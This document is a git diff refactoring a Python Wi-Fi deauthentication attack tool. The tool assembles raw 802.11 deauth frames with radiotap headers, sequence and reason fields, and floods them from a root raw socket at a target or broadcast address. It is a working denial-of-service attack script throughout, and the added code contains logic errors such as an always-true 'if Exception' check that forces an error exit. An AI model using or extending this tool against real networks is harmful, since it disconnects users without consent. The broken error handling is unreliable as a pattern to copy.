@@ -16,7 +16,6 @@
 # You should have received a copy of the GNU General Public License
 # along with this program. If not, see <https://www.gnu.org/licenses/>.
 
-# not all these imports are used in the final code, they are here until I determine exactly which file they will be used in
 import socket
 import okeusargs
 import convert
@@ -32,41 +31,29 @@ import exit
 import platform
 from datetime import datetime
 
+args = okeusargs.parse_arguments()
+
 def sys_checks():
     if platform.system() != 'Linux':
         print("ATTENTION: This program is intended only to be run on GNU/Linux")
         sys.exit(exit.EXIT_NOT_LINUX)
-
-    if os.geteuid() != 0:
-        print("ATTENTION: Script requires root privlages, please run as root")
-        sys.exit(exit.EXIT_NOT_ROOT)
-
-def f_assem(args):
-    # Parse command-line arguments
-    interface = args.netinterface
-    dest_mac = args.dest
-    source_mac = args.ap_source
-    network_bssid = args.net_bssid
-    broadcast_attack =  args.broadcast
-    frag = args.fragment
-    seq_num = args.sequence
-    reason_code = args.reason_code
-    timedelay = args.delay
-    frame_flood = args.flood
-    num_frames = args.count
-    dur = args.duration
-    randfrag = args.randomfrag
-    autoseq = args.autoseq
-    dry = args.dryrun
-    body_bytes = args.body_pad
-    verbose = args.verbose
-
-    if any(arg in sys.argv for arg in ("-h", "--help")):
+    elif any(arg in sys.argv for arg in ("-h", "--help")):
         parser = argparse.ArgumentParser()
         parser.print_help()
         sys.exit(exit.EXIT_SUCCESS)
+    elif os.geteuid() != 0:
+        print("ATTENTION: Script requires root privlages, please run as root")
+        sys.exit(exit.EXIT_NOT_ROOT)
+ 
+def f_assem(args):
+    dest_mac = args.dest
+    source_mac = args.ap_source
+    network_bssid = args.net_bssid
+    broadcast_attack = args.broadcast
+    frag = args.fragment
+    dur = args.duration
+    randfrag = args.randomfrag
 
-    
     # starts the 80211 mac header, deauth frame byte
     f_ctl = struct.pack('B', 0xC0)
 
@@ -102,7 +89,7 @@ def f_assem(args):
     # Address 2 field, if not given Address 3 fills
     if not source_mac:
         src = convert.machex(network_bssid)
-        src_n_v = "Source Addres will use Network Address"
+        src_n_v = "Source Address (Address 2) field will use Network Address (Address 3 field)"
     elif source_mac:
         src = convert.machex(source_mac)
 
@@ -119,32 +106,109 @@ def f_assem(args):
 
     return f_ctl, f_frag, f_dur, ct, src, net, ch, td, dr, src_n_v
 
-def main():
-    args = okeusargs.parse_arguments()
+def reas(args):
+    reason_code = args.reason_code
 
-    timedelay = args.delay
-    frame_flood = args.flood
-    num_frames = args.count
-    dur = args.duration
-    interface = args.netinterface
-    verbose = args.verbose
-    dest_mac = args.dest
-    source_mac = args.ap_source
-    network_bssid = args.net_bssid
-    broadcast_attack =  args.broadcast
+    if not reason_code:
+        rc = reason.reasoncode_input(0)
+    elif reason_code:
+        rc = reason.reasoncode_input(reason_code)
+
+    return rc
+
+def fs(args):
     frag = args.fragment
     seq_num = args.sequence
+    randfrag = args.randomfrag
+    autoseq = args.autoseq
+
+    if not hasattr(fs, "sn"):
+        fs.sn = 1
+    if not (frag or seq_num or randfrag or autoseq):
+        seq = struct.pack('<H', 0x00)
+
+    elif randfrag and not (frag or seq_num or autoseq):
+        rf = random.randint(1, 14)
+        seq = struct.pack('<H', rf & 0x0F)
+    elif autoseq and not (frag or seq_num or randfrag):
+        seq = struct.pack('<H', (fs.sn << 4) & 0xFFF0)
+        fs.sn += 1
+    elif (autoseq and randfrag) and not (seq_num or frag):
+        rf = random.randint(1, 14)
+        if rf >= 8:
+            seq = struct.pack('<H', ((fs.sn << 4) & 0xFFF0) | (rf & 0x0F))
+            fs.sn += 1
+        else:
+            seq = struct.pack('<H', (fs.sn << 4) & 0xFFF0)
+    elif (randfrag and seq_num) and not (frag or autoseq):
+        rf = random.randint(1, 14)
+        seq = struct.pack('<H', ((seq_num << 4) & 0xFFF0) | (rf & 0x0F))
+    elif frag and not (seq_num or randfrag or autoseq):
+        seq = struct.pack('<H', frag & 0x0F)
+    elif (frag and autoseq) and not (randfrag or seq_num):
+        seq = struct.pack('<H', ((fs.sn << 4) & 0xFFF0) | (frag & 0x0F))
+        fs.sn += 1
+    elif (frag and seq_num) and not (randfrag or autoseq):
+        seq = struct.pack('<H', ((seq_num << 4) & 0xFFF0) | (frag & 0x0F))
+    elif (seq_num) and not (frag or randfrag or autoseq):
+        seq = struct.pack('<H', ((seq_num << 4) & 0xFFF0) )
+
+    return seq
+
+def verb(args):
+    interface = args.netinterface
+    source_mac = args.ap_source
     reason_code = args.reason_code
     randfrag = args.randomfrag
     autoseq = args.autoseq
-    dry = args.dryrun
     body_bytes = args.body_pad
+    seq = fs(args)
+    f_ctl, f_frag, f_dur, ct, src, net, ch, td, dr, src_n_v = f_assem(args)
+    rad, vr, pad, rt_len, fp = radio.rt_head()
+
+    print(td)
+    if not source_mac:
+        print(src_n_v)
+    print(f"Interface: {interface}")
+    print("-" * 100)
+    print(f"{'Frame composition'.center(100)}")
+    print("-" * 100)
+    print(f"Radiotap version: {vr.hex()}")
+    print(f"Radiotap pad: {pad.hex()}")
+    print(f"Radiotap length: {rt_len.hex()}")
+    print(f"Radiotap fields present: {fp.hex()}")
+    print(f"Frame type: {f_ctl.hex().upper()}")
+    print(f"Fragmentation set: {f_frag.hex()} - type: {ch}")
+    print(f"Duration: {f_dur.hex().upper()}")
+    print(f"Destination: {ct.hex().upper()}")
+    print(f"Source: {src.hex().upper()}")
+    print(f"Network: {net.hex().upper()}")
+    if not (autoseq or randfrag):
+        print(f"Sequence Control: {seq.hex().upper()}")
+    if (autoseq or randfrag):
+        print("Sequence Control: DYNAMIC")
+    if not reason_code:
+        print(f"Reason Code: {reason.reasoncode_input(0).hex()} - {reason.def_code(0)}")
+    if reason_code:
+        print(f"Reason Code: {reason.reasoncode_input(reason_code).hex()} - {reason.def_code(reason_code)}")
+    if body:
+        print(f"Body padding: {body_bytes} null bytes padded")
+    print("-" * 100)
+
+def main():
+    dry = args.dryrun
+    interface = args.netinterface
+    verbose = args.verbose
+    body_bytes = args.body_pad
+    frame_flood = args.flood
+    num_frames = args.count
+    timedelay = args.delay
+
+    sys_checks()
 
     f_ctl, f_frag, f_dur, ct, src, net, ch, td, dr, src_n_v = f_assem(args)
     rad, vr, pad, rt_len, fp = radio.rt_head()
     df = rad + f_ctl + f_frag + f_dur + ct + src + net
-
-    sys_checks()
 
     if not dry:
         try:
@@ -162,81 +226,8 @@ def main():
     elif dry:
         print(dr)
 
-    def reas():
-        if not reason_code:
-            rc = reason.reasoncode_input(0)
-        if reason_code:
-            rc = reason.reasoncode_input(reason_code)
-
-        return rc
-
-    def fs():
-        if not hasattr(fs, "sn"):
-            fs.sn = 1
-        if not (frag or seq_num or randfrag or autoseq):
-            seq = struct.pack('<H', 0x00)
-
-        elif randfrag and not (frag or seq_num or autoseq):
-            rf = random.randint(1, 14)
-            seq = struct.pack('<H', rf & 0x0F)
-        elif autoseq and not (frag or seq_num or randfrag):
-            seq = struct.pack('<H', (fs.sn << 4) & 0xFFF0)
-            fs.sn += 1
-        elif (autoseq and randfrag) and not (seq_num or frag):
-            rf = random.randint(1, 14)
-            if rf >= 8:
-                seq = struct.pack('<H', ((fs.sn << 4) & 0xFFF0) | (rf & 0x0F))
-                fs.sn += 1
-            else:
-                seq = struct.pack('<H', (fs.sn << 4) & 0xFFF0)
-        elif (randfrag and seq_num) and not (frag or autoseq):
-            rf = random.randint(1, 14)
-            seq = struct.pack('<H', ((seq_num << 4) & 0xFFF0) | (rf & 0x0F))
-        elif frag and not (seq_num or randfrag or autoseq):
-            seq = struct.pack('<H', frag & 0x0F)
-        elif (frag and autoseq) and not (randfrag or seq_num):
-            seq = struct.pack('<H', ((fs.sn << 4) & 0xFFF0) | (frag & 0x0F))
-            fs.sn += 1
-        elif (frag and seq_num) and not (randfrag or autoseq):
-            seq = struct.pack('<H', ((seq_num << 4) & 0xFFF0) | (frag & 0x0F))
-        elif (seq_num) and not (frag or randfrag or autoseq):
-            seq = struct.pack('<H', ((seq_num << 4) & 0xFFF0) )
-
-        return seq
-
-    def verb():
-        seq = fs()
-        print(td)
-        if not source_mac:
-            print(src_n_v)
-        print(f"Interface: {interface}")
-        print("-" * 100)
-        print(f"{'Frame composition'.center(100)}")
-        print("-" * 100)
-        print(f"Radiotap version: {vr.hex()}")
-        print(f"Radiotap pad: {pad.hex()}")
-        print(f"Radiotap length: {rt_len.hex()}")
-        print(f"Radiotap fields present: {fp.hex()}")
-        print(f"Frame type: {f_ctl.hex().upper()}")
-        print(f"Fragmentation set: {f_frag.hex()} - type: {ch}")
-        print(f"Duration: {f_dur.hex().upper()}")
-        print(f"Destination: {ct.hex().upper()}")
-        print(f"Source: {src.hex().upper()}")
-        print(f"Network: {net.hex().upper()}")
-        if not (autoseq or randfrag):
-            print(f"Sequence Control: {seq.hex().upper()}")
-        if (autoseq or randfrag):
-            print("Sequence Control: DYNAMIC")
-        if not reason_code:
-            print(f"Reason Code: {reason.reasoncode_input(0).hex()} - {reason.def_code(0)}")
-        if reason_code:
-            print(f"Reason Code: {reason.reasoncode_input(reason_code).hex()} - {reason.def_code(reason_code)}")
-        if body:
-            print(f"Body padding: {body_bytes} null bytes padded")
-        print("-" * 100)
-
-    r = reas()
-    sq = fs()
+    r = reas(args)
+    sq = fs(args)
     if body_bytes:
         b = body.body_inject(body_bytes)
         frame = df + sq + r + b
@@ -250,12 +241,12 @@ def main():
         nmframe = 1
 
         if verbose:
-            verb()
+            verb(args)
         try:
             tg = ct.hex().upper()
             tgt = ''.join([f'\\x{tg[i:i+2]}' for i in range(0, len(tg), 2)])
-            print("Starting deauth attack") 
-            print(f"Flooding: {tgt}\nEnd attack with CTRL + C")
+            print("Starting flood attack") 
+            print(f"Flooding target: {tgt}\nEnd attack with CTRL + C")
             if num_frames:
                 n = num_frames
                 print(f"Sending {n} frames.")
@@ -289,6 +280,8 @@ def main():
                 if verbose:
                     print(f"Socket {s} closed")
                 s.close()
+            if Exception:
+                sys.exit(exit.EXIT_OSERROR)
             print("Completed!!!")
 
     if not frame_flood:
@@ -308,7 +301,7 @@ def main():
             n = 1
         try:
             if verbose:
-                verb()
+                verb(args)
             if timedelay:
                 print(f"Sending {n} frame(s) at a rate of {ti} ms.")
             if not timedelay:
@@ -341,8 +334,11 @@ def main():
                 if verbose:
                     print(f"Socket {s} closed")
                 s.close()
-            print("Completed!!!")
-            sys.exit(exit.EXIT_SUCCESS)
+            if Exception:
+                sys.exit(exit.EXIT_OSERROR)
+            else:
+                print("Completed!!!")
+                sys.exit(exit.EXIT_SUCCESS)
 
 if __name__ == "__main__":
     main()
